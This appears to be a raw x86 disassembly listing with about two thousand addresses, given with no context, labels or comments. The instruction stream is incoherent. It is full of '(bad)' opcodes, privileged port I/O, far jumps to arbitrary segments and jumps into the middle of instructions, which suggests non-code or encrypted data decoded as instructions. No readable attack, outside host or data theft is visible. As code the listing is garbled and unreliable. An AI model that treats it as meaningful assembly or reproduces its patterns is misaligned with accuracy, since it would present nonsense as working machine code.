  414c93:	xchg   ecx,eax
  414c94:	jecxz  0x414c3e
  414c96:	mov    DWORD PTR [eiz*2-0x15b69304],0xaeca8e0f
  414ca1:	add    ah,BYTE PTR [ebx+0x55]
  414ca4:	das    
  414ca5:	out    dx,al
  414ca6:	outs   dx,DWORD PTR ds:[esi]
  414ca7:	and    BYTE PTR [edx],ah
  414ca9:	(bad)  
  414caa:	fidivr WORD PTR [ebp+0x4a096280]
  414cb0:	dec    ebx
  414cb1:	jbe    0x414d14
  414cb3:	mov    edx,0x99301dcb
  414cb8:	bound  eax,QWORD PTR [ebp-0x1172e0a5]
  414cbe:	pushf  
  414cbf:	addr16 aaa 
  414cc1:	xor    BYTE PTR [ecx],0x84
  414cc4:	jg     0x414ce5
  414cc6:	shl    DWORD PTR [esi-0x6f533fea],0x58
  414ccd:	adc    ah,dh
  414ccf:	push   eax
  414cd0:	pop    ecx
  414cd1:	or     al,0x68
  414cd3:	cmp    eax,DWORD PTR [esi+0x79]
  414cd6:	inc    edi
  414cd7:	in     eax,dx
  414cd8:	sub    BYTE PTR [eax],ah
  414cda:	jmp    0xad4e635f
  414cdf:	xor    eax,0x378a7357
  414ce4:	jl     0x414cf6
  414ce6:	cmp    bl,BYTE PTR [ecx]
  414ce8:	(bad)  
  414ce9:	(bad)  
  414cea:	dec    ecx
  414ceb:	cmp    eax,0xb0bf5993
  414cf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cf1:	or     al,BYTE PTR [edx-0x6ca8349d]
  414cf7:	add    BYTE PTR [eax+esi*1],dl
  414cfa:	(bad)  
  414cfb:	fidiv  DWORD PTR [edx+0x67]
  414cfe:	gs daa 
  414d00:	aad    0xd5
  414d02:	arpl   di,di
  414d04:	inc    esp
  414d05:	ja     0x414ced
  414d07:	jg     0x414cba
  414d09:	sub    esi,DWORD PTR [ecx+edx*8+0x62]
  414d0d:	clc    
  414d0e:	dec    edi
  414d0f:	les    edx,FWORD PTR [ebp+0x59]
  414d12:	jg     0x414d67
  414d14:	inc    edx
  414d15:	scas   al,BYTE PTR es:[edi]
  414d16:	popf   
  414d17:	popa   
  414d18:	or     BYTE PTR [esi-0xd],al
  414d1b:	or     eax,0x50782e8
  414d20:	inc    ebp
  414d21:	mov    cl,0xa
  414d23:	fwait
  414d24:	fwait
  414d25:	mov    ebp,0x7acd3cef
  414d2a:	test   al,0xe4
  414d2c:	imul   DWORD PTR [esi]
  414d2e:	idiv   BYTE PTR [esi+ecx*4-0xf]
  414d32:	jg     0x414d37
  414d34:	push   ebx
  414d35:	push   eax
  414d36:	stos   BYTE PTR es:[edi],al
  414d37:	push   esp
  414d38:	inc    eax
  414d39:	inc    edi
  414d3a:	aaa    
  414d3b:	data16 (bad) 
  414d3d:	fwait
  414d3e:	shr    cl,0xed
  414d41:	pop    DWORD PTR [ebx-0x404d4811]
  414d47:	stos   DWORD PTR es:[edi],eax
  414d48:	pop    edi
  414d49:	sbb    bl,dh
  414d4b:	test   ebx,eax
  414d4d:	ja     0x7b063812
  414d53:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  414d55:	ins    BYTE PTR es:[edi],dx
  414d56:	mov    ebp,0x430fb4a1
  414d5b:	or     BYTE PTR [esi],0xa4
  414d5e:	push   0x4c
  414d60:	fcomp  QWORD PTR [ecx]
  414d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d64:	leave  
  414d65:	bndldx bnd0,[ecx+eax*1]
  414d69:	push   ebp
  414d6a:	mov    edx,0xcb44999e
  414d6f:	dec    edx
  414d70:	add    BYTE PTR [ebp-0xbc03676],dl
  414d76:	mov    ecx,0xda9f3e38
  414d7b:	call   0x4569:0xe4b6837
  414d82:	retf   
  414d83:	inc    esi
  414d84:	arpl   WORD PTR [ecx-0x4b],si
  414d87:	jnp    0x414d53
  414d89:	popf   
  414d8a:	sbb    eax,DWORD PTR [eax+esi*1+0x3ca81362]
  414d91:	dec    edx
  414d92:	stos   BYTE PTR es:[edi],al
  414d93:	int3   
  414d94:	push   edi
  414d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d96:	or     eax,0xf671b9a2
  414d9b:	call   0x64c74a6a
  414da0:	add    eax,0xf1a2385
  414da5:	loop   0x414e1f
  414da7:	sbb    eax,0xd866f3eb
  414dac:	fstp   TBYTE PTR [ebx]
  414dae:	xchg   ebx,eax
  414daf:	push   ecx
  414db0:	popa   
  414db1:	int3   
  414db2:	mov    esi,0x5807a56
  414db7:	lahf   
  414db8:	arpl   WORD PTR [ecx],bx
  414dba:	je     0x414d73
  414dbc:	jmp    0x414dc1
  414dbe:	fisttp QWORD PTR [edi]
  414dc0:	outs   dx,BYTE PTR ds:[esi]
  414dc1:	mov    ebx,0x4bf8f2f5
  414dc6:	xchg   ecx,eax
  414dc7:	pop    ebp
  414dc8:	cld    
  414dc9:	ja     0x414da1
  414dcb:	lds    esp,FWORD PTR [edi+0x30]
  414dce:	loop   0x414dac
  414dd0:	inc    esi
  414dd1:	mov    ds:0x57aa8eb3,al
  414dd6:	and    DWORD PTR ds:[ebx],eax
  414dd9:	jno    0x414e47
  414ddb:	sub    al,0xe0
  414ddd:	imul   esp,DWORD PTR [esi],0xfef95863
  414de3:	in     al,0xe8
  414de5:	xlat   BYTE PTR ds:[ebx]
  414de6:	xlat   BYTE PTR ds:[ebx]
  414de7:	xor    eax,edx
  414de9:	jg     0x414de8
  414deb:	inc    esp
  414dec:	iret   
  414ded:	push   edx
  414dee:	add    al,0x46
  414df0:	mov    dl,0xad
  414df2:	xchg   ebp,eax
  414df3:	pop    eax
  414df4:	xlat   BYTE PTR ds:[ebx]
  414df5:	sbb    eax,0xb6fa1492
  414dfa:	sub    BYTE PTR [edi],al
  414dfc:	adc    BYTE PTR [edx-0x68],ah
  414dff:	or     DWORD PTR [edi+ebp*2+0x4d],ebx
  414e03:	push   ss
  414e04:	sbb    BYTE PTR [ecx],0x67
  414e07:	cli    
  414e08:	clc    
  414e09:	sti    
  414e0a:	jecxz  0x414dcf
  414e0c:	pop    edx
  414e0d:	xor    al,0x8
  414e0f:	push   0x5e97339e
  414e14:	push   es
  414e15:	jb     0x414e52
  414e17:	sbb    BYTE PTR [eax],0xbe
  414e1a:	data16 sti 
  414e1c:	cdq    
  414e1d:	ja     0x414e6d
  414e1f:	in     eax,0xb2
  414e21:	mov    edi,0xd7e9962c
  414e26:	imul   ebx,DWORD PTR [edi+ebx*4],0x36
  414e2a:	xchg   esi,eax
  414e2b:	aaa    
  414e2c:	repz dec ecx
  414e2e:	out    0x8f,al
  414e30:	cmovg  edx,edi
  414e33:	dec    edi
  414e34:	xchg   ebx,ebx
  414e36:	xor    eax,0x86b5d336
  414e3b:	mov    ecx,0x3901a4cd
  414e40:	mov    esp,ss
  414e42:	xchg   ebx,eax
  414e43:	iret   
  414e44:	xor    al,0x5f
  414e46:	aaa    
  414e47:	push   ebp
  414e48:	dec    ebp
  414e49:	dec    esi
  414e4a:	mov    dh,0x7f
  414e4c:	fstp   DWORD PTR [eax+0x6]
  414e4f:	sbb    ebx,DWORD PTR [esi+0x14]
  414e52:	fisttp WORD PTR [ebp-0xf]
  414e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e56:	push   es
  414e57:	push   0x69cc361a
  414e5c:	int3   
  414e5d:	or     DWORD PTR [di+0x6ec8],0x45483b50
  414e66:	cld    
  414e67:	aad    0xd1
  414e69:	cmp    dl,bh
  414e6b:	stc    
  414e6c:	js     0x414e0a
  414e6e:	dec    ecx
  414e6f:	fmulp  st(4),st
  414e71:	lods   al,BYTE PTR ds:[esi]
  414e72:	out    dx,al
  414e73:	icebp  
  414e74:	js     0x414e51
  414e76:	inc    eax
  414e77:	push   ecx
  414e78:	or     al,ah
  414e7a:	pop    edi
  414e7b:	shr    BYTE PTR [ebp-0x949e5ef],0xab
  414e82:	in     al,0xe1
  414e84:	pop    ecx
  414e85:	dec    ebx
  414e86:	mov    ebx,0xb478f683
  414e8b:	mov    eax,0x13c33c57
  414e90:	jo     0x414eb8
  414e92:	in     al,0x30
  414e94:	mov    eax,0x5cdd92f1
  414e99:	push   0x3
  414e9b:	mov    dh,0x1d
  414e9d:	jmp    0xde64787f
  414ea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ea3:	xor    al,0xca
  414ea5:	icebp  
  414ea6:	aaa    
  414ea7:	aad    0xeb
  414ea9:	cli    
  414eaa:	or     al,0x1d
  414eac:	fdivr  st,st(7)
  414eae:	fs jmp 0x3907:0x90783aa3
  414eb6:	and    DWORD PTR [esp+ebx*2-0xb9407d3],ebx
  414ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ebe:	push   ebp
  414ebf:	dec    eax
  414ec0:	push   esi
  414ec1:	aas    
  414ec2:	pop    ds
  414ec3:	lahf   
  414ec4:	mov    edi,0xc47a98ee
  414ec9:	mov    edi,0xc3f1c58b
  414ece:	jnp    0x414e61
  414ed0:	hlt    
  414ed1:	and    BYTE PTR [ebx],0xe
  414ed4:	(bad)  
  414ed5:	xor    BYTE PTR [eax+eax*4],dl
  414ed8:	inc    edx
  414ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eda:	and    al,0xf7
  414edc:	ja     0x414f1a
  414ede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414edf:	sbb    al,0x35
  414ee1:	sbb    DWORD PTR [ecx-0x1c],ebp
  414ee4:	sub    BYTE PTR ds:0xf7d8e0c3,ch
  414eea:	js     0x414e90
  414eec:	jo     0x414ed8
  414eee:	mov    eax,0xf389c7c2
  414ef3:	push   eax
  414ef4:	(bad)  
  414ef5:	fiadd  DWORD PTR [ecx]
  414ef7:	cs jnp 0x414eaa
  414efa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414efb:	pusha  
  414efc:	outs   dx,BYTE PTR ds:[esi]
  414efd:	mov    edx,0x8b3f8e6e
  414f02:	imul   esp,DWORD PTR [ebx+ecx*2+0x56],0x73d72f43
  414f0a:	pop    esp
  414f0b:	div    DWORD PTR [edi-0x51]
  414f0e:	inc    esi
  414f0f:	fsub   DWORD PTR [ecx]
  414f11:	inc    ecx
  414f12:	cmp    DWORD PTR [edi+0x688a485f],ecx
  414f18:	fild   QWORD PTR [ecx+0x6b]
  414f1b:	xchg   esp,eax
  414f1c:	jo     0x414ea8
  414f1e:	ret    
  414f1f:	jp     0x414f0d
  414f21:	enter  0x8e,0x4c
  414f25:	call   0xa00a:0x943ab48c
  414f2c:	pusha  
  414f2d:	(bad)  
  414f2f:	retf   0x1598
  414f32:	(bad)  
  414f33:	addr16 adc al,0x84
  414f36:	jmp    0x414f95
  414f38:	in     eax,0x76
  414f3a:	call   edi
  414f3c:	add    al,BYTE PTR [edx+0x2b]
  414f3f:	mov    al,0x34
  414f41:	lods   eax,DWORD PTR ds:[esi]
  414f42:	arpl   WORD PTR [eax+0x69],sp
  414f45:	jnp    0x414f7b
  414f47:	xor    dl,bh
  414f49:	mov    eax,ds:0xa80a97e8
  414f4e:	mov    gs,WORD PTR [edi+0x7f8a44a3]
  414f54:	int    0xdc
  414f56:	ss push edi
  414f58:	cmp    ecx,esi
  414f5a:	sahf   
  414f5b:	push   edi
  414f5c:	stc    
  414f5d:	jne    0x414fa3
  414f5f:	test   al,0x35
  414f61:	leave  
  414f62:	mov    eax,0x550eec88
  414f67:	inc    esi
  414f68:	ja     0x414f8e
  414f6a:	mov    al,0x41
  414f6c:	jo     0x414fb3
  414f6e:	pushf  
  414f6f:	jno    0x414f6e
  414f71:	dec    edi
  414f72:	xor    DWORD PTR [edx],edi
  414f74:	fst    QWORD PTR [ebp+0x2251f3ab]
  414f7a:	inc    ch
  414f7c:	std    
  414f7d:	not    DWORD PTR [ecx]
  414f7f:	loopne 0x414f58
  414f81:	push   ecx
  414f82:	jb     0x414f60
  414f84:	add    al,0x95
  414f86:	push   ebp
  414f87:	pause  
  414f89:	outs   dx,BYTE PTR ds:[esi]
  414f8a:	inc    esi
  414f8b:	jmp    0x9ff7:0x5a054370
  414f92:	gs push esp
  414f94:	(bad)  
  414f96:	mov    ah,0x9b
  414f98:	popf   
  414f99:	ins    DWORD PTR es:[edi],dx
  414f9a:	push   cs
  414f9b:	dec    ebp
  414f9c:	pop    ebx
  414f9d:	cs xor ecx,eax
  414fa0:	add    DWORD PTR [eax+0x22ad8979],eax
  414fa6:	loopne 0x41501d
  414fa8:	mov    al,ds:0x351c4610
  414fad:	es out dx,eax
  414faf:	out    dx,al
  414fb0:	mov    ebx,0x8924e25f
  414fb5:	call   0x7fe226c1
  414fba:	mov    dh,0xcc
  414fbc:	cld    
  414fbd:	in     eax,0x6f
  414fbf:	cwde   
  414fc0:	lock cmp al,0x17
  414fc3:	mov    cl,0xe4
  414fc5:	cmp    eax,ebx
  414fc7:	ins    BYTE PTR es:[edi],dx
  414fc8:	outs   dx,BYTE PTR ds:[esi]
  414fc9:	ret    0x6121
  414fcc:	fnstenv [eax+0x16c473f9]
  414fd2:	cmc    
  414fd3:	and    cl,bh
  414fd5:	scas   al,BYTE PTR es:[edi]
  414fd6:	fisttp QWORD PTR [edi+0x47649c54]
  414fdc:	xchg   edi,eax
  414fdd:	jns    0x414f8d
  414fdf:	pop    eax
  414fe0:	fcomi  st,st(0)
  414fe2:	fisttp WORD PTR [esi+0x1]
  414fe5:	mov    al,ds:0x7e96476c
  414fea:	jne    0x414fc4
  414fec:	push   esp
  414fed:	inc    edx
  414fee:	push   0x5a
  414ff0:	jecxz  0x414f89
  414ff2:	add    BYTE PTR [eax+0x41603d87],bh
  414ff8:	mov    esp,0xae52ff01
  414ffd:	jno    0x414f81
  414fff:	popa   
  415000:	sbb    edx,DWORD PTR [ecx]
  415002:	mov    edi,0x9f8eb0a3
  415007:	sti    
  415008:	lods   al,BYTE PTR ds:[esi]
  415009:	mov    ecx,0xa75bb2af
  41500e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41500f:	into   
  415010:	push   edx
  415011:	les    ebx,FWORD PTR [ebx-0x44a56ddf]
  415017:	add    eax,0xfcc70dac
  41501c:	mov    ds:0x7e089ff8,eax
  415021:	(bad)  
  415022:	and    ch,BYTE PTR [edi+0x77]
  415025:	sti    
  415026:	push   ss
  415027:	aaa    
  415028:	shr    BYTE PTR [esi+0x2abb7468],0x19
  41502f:	xchg   ebx,eax
  415030:	(bad)  
  415031:	sbb    ebp,DWORD PTR [edi+0x1c04feec]
  415037:	dec    ebp
  415038:	es dec edx
  41503a:	and    eax,0x633961a3
  41503f:	and    BYTE PTR [ebx+0x45cecdea],ah
  415045:	pushf  
  415046:	lahf   
  415047:	fistp  QWORD PTR [eax+ecx*4+0x3fcbcfdc]
  41504e:	jmp    0x1560:0x8aadb58e
  415055:	clc    
  415056:	retf   0x97a8
  415059:	rcr    DWORD PTR [edi-0x58],cl
  41505c:	jb     0x415078
  41505e:	std    
  41505f:	xor    bh,BYTE PTR [edi+0x2]
  415062:	or     eax,ebx
  415064:	gs sbb bl,bl
  415067:	mov    edx,esp
  415069:	cmp    bl,BYTE PTR [esi]
  41506b:	ds inc esp
  41506d:	cdq    
  41506e:	retf   0xe587
  415071:	js     0x41503a
  415073:	mov    eax,0x74274627
  415078:	add    al,0xca
  41507a:	xor    eax,0x18d052d1
  41507f:	repz loope 0x41508b
  415082:	stc    
  415083:	imul   esp,DWORD PTR [eax+0x237eb923],0x6719e145
  41508d:	rcl    BYTE PTR [ebx+0x71],0xdc
  415091:	or     bl,BYTE PTR [eax]
  415093:	mov    ebx,0x2fc53d88
  415098:	cld    
  415099:	or     edi,DWORD PTR [ebp-0x1f]
  41509c:	sbb    DWORD PTR [edx],ecx
  41509e:	lds    eax,FWORD PTR [esi-0x70]
  4150a1:	or     eax,0xe121ae6d
  4150a6:	pop    ss
  4150a7:	pusha  
  4150a8:	stc    
  4150a9:	xchg   edi,eax
  4150aa:	mov    edi,DWORD PTR [ebx]
  4150ac:	push   edi
  4150ad:	adc    BYTE PTR [eax],bl
  4150af:	dec    esi
  4150b0:	retf   0x7529
  4150b3:	mov    ebp,edi
  4150b5:	and    eax,0xf79288b8
  4150ba:	cmp    eax,0x4931963e
  4150bf:	or     al,0x85
  4150c1:	mov    ecx,0x6b38537d
  4150c6:	sti    
  4150c7:	arpl   WORD PTR [esi+0x1c],bp
  4150ca:	push   0x18948d87
  4150cf:	mov    ebx,0x83f11528
  4150d4:	or     ebx,DWORD PTR [ecx+eiz*2+0x52ffd76b]
  4150db:	jmp    0x41505f
  4150dd:	inc    edx
  4150de:	push   ebx
  4150df:	pushf  
  4150e0:	loop   0x4150ff
  4150e2:	push   edx
  4150e3:	cdq    
  4150e4:	sahf   
  4150e5:	call   0xc0b9:0xd1598b4
  4150ec:	xor    eax,0x2adf5d2d
  4150f1:	adc    ebx,DWORD PTR [ecx]
  4150f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150f4:	test   al,0xd3
  4150f6:	sub    BYTE PTR [edi-0x2be1e187],bh
  4150fc:	dec    edi
  4150fd:	mov    ch,0xcb
  4150ff:	dec    eax
  415100:	mov    bh,0xa9
  415102:	cmp    bl,BYTE PTR [esi+esi*4+0x37]
  415106:	(bad)  
  415108:	mov    esi,0x1caf303f
  41510d:	xchg   edi,eax
  41510e:	dec    esp
  41510f:	bound  ebx,QWORD PTR [esp+esi*2-0x67]
  415113:	fxch   st(7)
  415115:	push   edx
  415116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415117:	push   ebx
  415118:	pop    edi
  415119:	mov    al,0xac
  41511b:	mov    esi,esi
  41511d:	je     0x41510c
  41511f:	(bad)  
  415120:	xchg   esp,eax
  415121:	pop    ecx
  415122:	push   esi
  415123:	dec    ebp
  415124:	pop    edi
  415125:	test   DWORD PTR [eax],edx
  415127:	into   
  415128:	sub    ebp,ecx
  41512a:	call   DWORD PTR [edi+0x3c071b1]
  415130:	adc    DWORD PTR [ebp-0x28],0x1e
  415134:	imul   edx,eax,0xffffff9c
  415137:	jno    0x4150fd
  415139:	and    al,0x5
  41513b:	add    BYTE PTR [ecx],dh
  41513d:	mov    ebx,0x3e393037
  415142:	push   ebx
  415143:	shl    dh,0xb1
  415146:	adc    DWORD PTR [esi],edx
  415148:	dec    edx
  415149:	(bad)  
  41514a:	int3   
  41514b:	scas   eax,DWORD PTR es:[edi]
  41514c:	shl    BYTE PTR [ebx],cl
  41514e:	aam    0xea
  415150:	mov    ch,0xf8
  415152:	jmp    0xec2d:0xa1488144
  415159:	retf   0xcb89
  41515c:	mov    ch,0xa
  41515e:	retf   
  41515f:	(bad)  ds:0xcc463bb5
  415165:	mov    eax,0x1b4ad446
  41516a:	fisttp WORD PTR [eax-0x44d656bf]
  415170:	sub    DWORD PTR [esi+0x51],edi
  415173:	das    
  415174:	lods   al,BYTE PTR ds:[esi]
  415175:	retf   
  415176:	cmp    eax,0x9bf24be
  41517b:	xchg   ebx,eax
  41517c:	pop    esp
  41517d:	aaa    
  41517e:	loope  0x4151fe
  415180:	jmp    0x7c34:0xb15ac692
  415187:	outs   dx,BYTE PTR ds:[esi]
  415188:	cmp    cl,cl
  41518a:	xor    dh,bl
  41518c:	and    DWORD PTR [ecx-0x4de93661],0x7268f00d
  415196:	nop
  415197:	(bad)  
  415198:	std    
  415199:	out    0x66,eax
  41519b:	push   edi
  41519c:	(bad)  
  41519d:	sub    BYTE PTR [esi-0xe],ch
  4151a0:	(bad)  
  4151a1:	sub    BYTE PTR [ebx-0x3c8edf77],al
  4151a7:	lods   al,BYTE PTR ds:[esi]
  4151a8:	rcr    DWORD PTR [esi+ecx*1],0x4c
  4151ac:	pop    ds
  4151ad:	mov    esp,0x40af605a
  4151b2:	mov    bh,0x4d
  4151b4:	sahf   
  4151b5:	sbb    DWORD PTR [edx],0x4e6a948d
  4151bb:	loope  0x41518e
  4151bd:	pusha  
  4151be:	pop    edi
  4151bf:	cmp    al,0x8d
  4151c1:	or     cl,bl
  4151c3:	add    cl,BYTE PTR [ebp+eax*8-0x1]
  4151c7:	aas    
  4151c8:	nop
  4151c9:	mov    eax,ds:0x6786651
  4151ce:	or     eax,0x5dda4563
  4151d3:	loope  0x415206
  4151d5:	out    dx,al
  4151d6:	xor    cl,bl
  4151d8:	dec    edx
  4151d9:	cli    
  4151da:	hlt    
  4151db:	dec    ebx
  4151dc:	pop    ds
  4151dd:	push   ecx
  4151de:	lds    eax,FWORD PTR [edx+0x63]
  4151e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151e2:	jb     0x4151ed
  4151e4:	dec    ebp
  4151e5:	push   ebp
  4151e6:	das    
  4151e7:	inc    ebx
  4151e8:	loop   0x4151f8
  4151ea:	jge    0x4151b7
  4151ec:	pop    ecx
  4151ed:	subps  xmm7,xmm7
  4151f0:	aam    0x36
  4151f2:	retf   
  4151f3:	xchg   ebx,eax
  4151f4:	and    eax,0xcc5c885f
  4151f9:	dec    edi
  4151fa:	xchg   esp,eax
  4151fb:	xor    DWORD PTR [esi],ecx
  4151fd:	lods   al,BYTE PTR ds:[esi]
  4151fe:	loop   0x4151df
  415200:	nop
  415201:	mov    ah,0xf7
  415203:	lea    ebp,[ebp+0x70]
  415206:	push   esp
  415207:	das    
  415208:	xchg   di,ax
  41520a:	dec    ebx
  41520b:	(bad)  
  41520c:	lea    esp,ds:0x971d5418
  415212:	iret   
  415213:	out    dx,al
  415214:	int3   
  415215:	jne    0x415246
  415217:	push   edx
  415218:	fcomip st,st(6)
  41521a:	in     al,0x59
  41521c:	into   
  41521d:	adc    BYTE PTR [ebp-0x54f33a83],dl
  415223:	fwait
  415224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415225:	imul   ebx,DWORD PTR [ebx],0x44a95ee6
  41522b:	or     eax,0xec2d5368
  415230:	clc    
  415231:	mov    bh,0x91
  415233:	lods   al,BYTE PTR ds:[esi]
  415234:	or     ecx,DWORD PTR [edx+0x6f]
  415237:	sub    esp,eax
  415239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41523a:	call   0x28908013
  41523f:	jo     0x415213
  415241:	inc    ecx
  415242:	aas    
  415243:	and    al,0x80
  415246:	bnd je 0x41526c
  415249:	in     eax,0x52
  41524b:	adc    edx,DWORD PTR [esi]
  41524d:	jb     0x415298
  41524f:	pop    esp
  415250:	inc    ebx
  415251:	pop    es
  415252:	sub    al,0x2a
  415254:	mov    ch,0x99
  415257:	jle    0x41521b
  415259:	ss add al,0x11
  41525c:	xor    ecx,DWORD PTR [esi+0x59fe8b07]
  415262:	adc    ebx,DWORD PTR [esi]
  415264:	pop    esp
  415265:	push   es
  415266:	in     eax,0x2d
  415268:	add    BYTE PTR [edi-0x78db487],0x47
  41526f:	mov    ebp,0xd877481d
  415274:	retf   
  415275:	mov    ds:0x7318b3b4,eax
  41527a:	jmp    0x2c40:0xeb5e5889
  415281:	mov    BYTE PTR [edi+0xc],ah
  415284:	stos   DWORD PTR es:[edi],eax
  415285:	dec    ebx
  415286:	jo     0x415222
  415288:	adc    ecx,esi
  41528a:	fs fs sahf 
  41528d:	arpl   WORD PTR [esi],di
  41528f:	fcom   st(1)
  415291:	and    eax,0x7a0c37ac
  415296:	fidivr DWORD PTR [edx+0xe]
  415299:	mov    cl,0x42
  41529b:	adc    bh,BYTE PTR es:[ecx+0x4c]
  41529f:	out    0xd5,eax
  4152a1:	cmp    BYTE PTR [ebp+0x69],ah
  4152a4:	fidivr DWORD PTR [edi+0x75]
  4152a7:	mov    edx,0x9c3b0d8d
  4152ac:	in     eax,0x38
  4152ae:	dec    ebx
  4152af:	or     eax,0x55edb76e
  4152b4:	fwait
  4152b5:	enter  0xa41f,0x9
  4152b9:	xor    ebx,DWORD PTR [ebp-0x5b9f5a49]
  4152bf:	or     eax,0x7c94f25b
  4152c4:	clc    
  4152c5:	mov    ds:0x5007ef58,eax
  4152ca:	ins    DWORD PTR es:[edi],dx
  4152cb:	jbe    0x41532a
  4152cd:	push   ebx
  4152ce:	mov    eax,0x8b213fe6
  4152d3:	loop   0x41531a
  4152d5:	push   eax
  4152d6:	or     edi,DWORD PTR [ebp+0x1]
  4152d9:	js     0x41528c
  4152db:	mov    BYTE PTR ds:0x98697c3b,bh
  4152e1:	ror    DWORD PTR [edx+ebp*1+0x186f8d8c],1
  4152e8:	jno    0x415295
  4152ea:	xor    BYTE PTR [edx+0x10],bh
  4152ed:	fs hlt 
  4152ef:	xchg   edi,eax
  4152f0:	imul   edi,DWORD PTR [ecx-0x4],0xe45eebd1
  4152f7:	push   eax
  4152f8:	pusha  
  4152f9:	test   BYTE PTR [ecx],0x26
  4152fc:	(bad)  
  4152fd:	cli    
  4152fe:	or     al,0xe5
  415300:	fwait
  415301:	sbb    DWORD PTR [ecx-0x39c09b6],0xffffffb7
  415308:	(bad)  
  415309:	fiadd  WORD PTR [edx]
  41530b:	dec    ebp
  41530c:	jnp    0x4152b7
  41530e:	push   ds
  41530f:	jl     0x415372
  415311:	cmp    esp,edi
  415313:	xchg   ebp,eax
  415314:	xor    al,0xef
  415316:	jle    0x415368
  415318:	gs fdivr st(4),st
  41531b:	(bad)  
  41531c:	sub    DWORD PTR [eax-0x45],eax
  41531f:	mov    ecx,0x4e11bdcd
  415324:	out    dx,eax
  415325:	mov    cl,ah
  415327:	dec    edx
  415328:	and    esi,DWORD PTR [ecx+0x2bd62f92]
  41532e:	(bad)  
  41532f:	push   eax
  415330:	xor    al,0x2a
  415332:	ins    DWORD PTR es:[edi],dx
  415333:	(bad)  
  415334:	mov    edi,0xd437838c
  415339:	repz fld TBYTE PTR ds:[ebp-0x59]
  41533e:	cs pop esi
  415340:	jno    0x415363
  415342:	jecxz  0x415373
  415344:	pusha  
  415345:	push   ecx
  415346:	rcr    DWORD PTR [esi-0x3d552986],0xca
  41534d:	stos   BYTE PTR es:[edi],al
  41534e:	pushf  
  41534f:	out    0xb8,al
  415351:	push   cs
  415352:	or     eax,0x40a8aac2
  415357:	bound  ebp,QWORD PTR [ecx+0x1e]
  41535a:	push   cs
  41535b:	sub    al,0x38
  41535d:	mov    ch,BYTE PTR [esp-0x1564705e]
  415364:	ds xor esi,edi
  415367:	pop    esp
  415368:	or     bl,BYTE PTR ds:0x71ff3688
  41536e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41536f:	fcmovnbe st,st(5)
  415371:	in     eax,dx
  415372:	pop    esp
  415373:	sub    BYTE PTR [eax],dh
  415375:	xchg   ebx,eax
  415376:	push   ss
  415377:	or     eax,0xd560e275
  41537c:	or     DWORD PTR [ecx+0x72],ecx
  41537f:	fsub   DWORD PTR [edi+0x4]
  415382:	inc    ebx
  415383:	xchg   BYTE PTR ss:[esi+0x128fc8fd],dh
  41538a:	nop
  41538b:	ret    
  41538c:	xlat   BYTE PTR ds:[ebx]
  41538d:	ror    BYTE PTR cs:[esi],0x80
  415391:	sbb    dl,BYTE PTR [ebx+edi*8-0x1]
  415395:	fist   WORD PTR [eax]
  415397:	into   
  415398:	repz mov ds:0x87d41340,al
  41539e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41539f:	repz dec edx
  4153a1:	mov    edi,0x8f36aa73
  4153a6:	add    BYTE PTR [esi-0x2534c0e5],bh
  4153ac:	adc    dl,al
  4153ae:	aaa    
  4153af:	push   es
  4153b0:	pop    ds
  4153b1:	in     al,0xb2
  4153b3:	sbb    cl,BYTE PTR [edi+0x48798791]
  4153b9:	fidiv  DWORD PTR [eax-0x4dcacb46]
  4153bf:	mov    al,ds:0x4aa35a52
  4153c4:	sbb    al,0xaf
  4153c7:	or     dl,BYTE PTR [esi]
  4153c9:	aam    0xc0
  4153cb:	dec    ebp
  4153cc:	or     ch,ch
  4153ce:	inc    ecx
  4153cf:	xor    al,0x66
  4153d1:	retf   
  4153d2:	ret    0x6128
  4153d5:	sbb    DWORD PTR [eax-0x4c049404],ebx
  4153db:	pop    edx
  4153dc:	sar    DWORD PTR gs:[ecx+ecx*1],cl
  4153e0:	sub    dh,BYTE PTR [ecx-0x2]
  4153e3:	inc    edx
  4153e4:	nop
  4153e5:	jecxz  0x415390
  4153e7:	cwde   
  4153e8:	pop    edx
  4153e9:	loop   0x415432
  4153eb:	xor    ah,BYTE PTR [esi]
  4153ed:	mov    eax,0xc243de4b
  4153f2:	mov    ebx,DWORD PTR [ecx]
  4153f4:	in     eax,dx
  4153f5:	pop    ds
  4153f6:	pop    esp
  4153f7:	fdiv   QWORD PTR ds:[ebx]
  4153fa:	jl     0x41537e
  4153fc:	in     al,0x7a
  4153fe:	push   esp
  4153ff:	outs   dx,BYTE PTR ds:[esi]
  415400:	inc    eax
  415401:	push   eax
  415402:	sub    eax,0x918ed077
  415407:	mov    ecx,0x380f2045
  41540c:	and    al,dl
  41540e:	sub    eax,DWORD PTR [edi+0x467c265a]
  415414:	mov    esi,0x9025c3de
  415419:	popf   
  41541a:	lahf   
  41541b:	ror    DWORD PTR [ecx-0x64],1
  41541e:	stc    
  41541f:	xor    BYTE PTR [esi],0xdc
  415422:	add    al,0x98
  415424:	enter  0x8225,0x10
  415428:	dec    esi
  415429:	(bad)  
  41542a:	xchg   ebx,eax
  41542b:	dec    edx
  41542c:	pop    ebx
  41542d:	sub    eax,0x668384e7
  415432:	xor    bh,BYTE PTR [edx+eiz*4-0x481bfb39]
  415439:	sub    ch,cl
  41543b:	shr    DWORD PTR ds:0xb4ee4144,1
  415441:	js     0x415410
  415443:	ja     0x415457
  415445:	fwait
  415446:	xchg   ebx,eax
  415447:	popa   
  415448:	ins    BYTE PTR es:[edi],dx
  415449:	jg     0x41542d
  41544b:	xchg   ebp,eax
